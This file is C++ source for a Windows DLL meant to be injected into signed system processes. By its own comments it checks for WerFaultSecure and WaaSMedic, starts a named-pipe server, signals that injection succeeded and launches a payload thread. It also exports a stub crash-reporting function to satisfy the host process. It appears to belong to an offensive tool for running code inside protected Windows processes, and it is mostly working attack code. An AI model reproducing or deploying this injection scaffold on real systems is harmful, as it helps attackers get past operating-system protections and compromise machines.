#include "common.h"
#include "payload.h"
#include "Server.h"

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    LPWSTR pwszExeFileName = NULL;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:

        DEBUG(L"Process attach");

        if (GetExeFileName(&pwszExeFileName))
        {
            if (!_wcsicmp(pwszExeFileName, STR_SIGNED_EXE_NAME))
            {
                //
                // If we are in WerFaultSecure, create the server and start listening
                // in the current thread. This is not ideal because we are blocking 
                // DllMain. But if we don't do this the process will terminate before 
                // we have time to do anything else.
                //

                Server* server = new Server(STR_IPC_PIPE_NAME);

                if (server->Create())
                {
                    SignalDllLoadEvent(STR_IPC_WERFAULT_LOAD_EVENT_NAME);

                    server->Listen();

                    delete server;
                }
            }

            LocalFree(pwszExeFileName);
        }

        break;

    case DLL_PROCESS_DETACH:

        DEBUG(L"Process detach");

        break;
    }

    DisableThreadLibraryCalls(hinstDLL);

    return TRUE;
}

__control_entrypoint(DllExport)
STDAPI DllCanUnloadNow()
{
    DEBUG(L"DllCanUnloadNow");
    return S_OK;
}

_Check_return_
STDAPI DllGetClassObject(_In_ REFCLSID rclsid, _In_ REFIID riid, _Outptr_ LPVOID FAR* ppv)
{
    DEBUG(L"DllGetClassObject");

    *ppv = NULL;

    Server* server = new Server(STR_IPC_PIPE_NAME);

    // Signal the DLL load event to let the client know that the DLL was
    // successfully injected.
    SignalDllLoadEvent(STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);

    // Create the server and start listening in a separate thread to let this
    // function return.
    if (server->Create())
    {
        CreateThread(NULL, 0, PayloadThread, server, 0, NULL);
    }

    return CLASS_E_CLASSNOTAVAILABLE;
}

STDAPI DllRegisterServer()
{
    DEBUG(L"DllRegisterServer");
    return E_UNEXPECTED;
}

STDAPI DllUnregisterServer()
{
    DEBUG(L"DllUnregisterServer");
    return E_UNEXPECTED;
}

VOID APIENTRY WerpInitiateCrashReporting()
{
    DEBUG(L"WerpInitiateCrashReporting");
}